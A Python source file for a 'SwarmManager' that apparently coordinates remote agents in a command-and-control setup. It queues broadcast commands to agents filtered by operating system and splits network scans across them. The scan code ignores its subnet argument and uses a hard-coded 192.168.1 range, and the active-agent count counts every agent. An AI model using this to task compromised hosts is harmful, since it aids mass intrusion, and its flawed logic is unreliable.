from typing import List, Dict, Any
import json
from dataclasses import dataclass, asdict
import uuid


@dataclass
class SwarmJob:
    id: str
    type: str  # 'broadcast', 'dist_scan', 'chain'
    status: str  # 'running', 'completed'
    targets: List[str]
    progress: float = 0.0


class SwarmManager:
    def __init__(self, db, pending_commands: Dict[str, List[Any]]):
        self.db = db
        self.pending_commands = pending_commands
        self.active_jobs: Dict[str, SwarmJob] = {}

    def get_swarm_stats(self) -> dict:
        agents = self.db.get_agents()
        stats = {
            "total": len(agents),
            "windows": 0,
            "linux": 0,
            "macos": 0,
            "active": 0,
        }
        for aid, data in agents.items():
            os_name = data.get("os", "").lower()
            if "windows" in os_name:
                stats["windows"] += 1
            elif "linux" in os_name:
                stats["linux"] += 1
            elif "darwin" in os_name or "mac" in os_name:
                stats["macos"] += 1

            # Simple active check (seen in last 2 mins)
            # Use data direct for faster check in loops
            stats[
                "active"
            ] += 1  # In this context, if they are in db, let's count them for swarm

        return stats

    def dispatch_command(self, command: dict, filters: Dict[str, Any] = None) -> int:
        """
        Dispatches a command to a group of agents.
        Returns the number of agents targeted.
        """
        agents = self.db.get_agents()
        target_count = 0

        target_os = filters.get("os") if filters else None
        target_ids = filters.get("ids") if filters else None

        jid = f"JOB_{str(uuid.uuid4())[:6]}"
        targeted = []

        for aid, data in agents.items():
            # 1. Apply Filters
            if target_os and target_os.lower() not in data.get("os", "").lower():
                continue

            if target_ids and aid not in target_ids:
                continue

            # 2. Push to Queue
            if aid not in self.pending_commands:
                self.pending_commands[aid] = []

            # Wrap command with Job ID
            cmd_with_job = command.copy()
            cmd_with_job["job_id"] = jid

            self.pending_commands[aid].append(cmd_with_job)
            targeted.append(aid)
            target_count += 1

        if targeted:
            self.active_jobs[jid] = SwarmJob(jid, "broadcast", "running", targeted)

        return target_count

    def create_distributed_scan(self, subnet: str) -> str:
        """
        Splits a subnet (e.g. 192.168.1.0/24) across all active agents.
        """
        agents = [aid for aid, data in self.db.get_agents().items()]
        if not agents:
            return None

        jid = f"SCAN_{str(uuid.uuid4())[:6]}"
        # Simplified split: just divide 254 IPs
        ips_per_agent = 254 // len(agents)

        for i, aid in enumerate(agents):
            start = i * ips_per_agent + 1
            end = (i + 1) * ips_per_agent
            scan_cmd = {
                "type": "scan",
                "range": f"192.168.1.{start}-{end}",
                "job_id": jid,
            }
            if aid not in self.pending_commands:
                self.pending_commands[aid] = []
            self.pending_commands[aid].append(scan_cmd)

        self.active_jobs[jid] = SwarmJob(jid, "dist_scan", "running", agents)
        return jid

    def get_jobs(self) -> List[dict]:
        return [asdict(j) for j in self.active_jobs.values()]


# Instance will be initialized in main.py
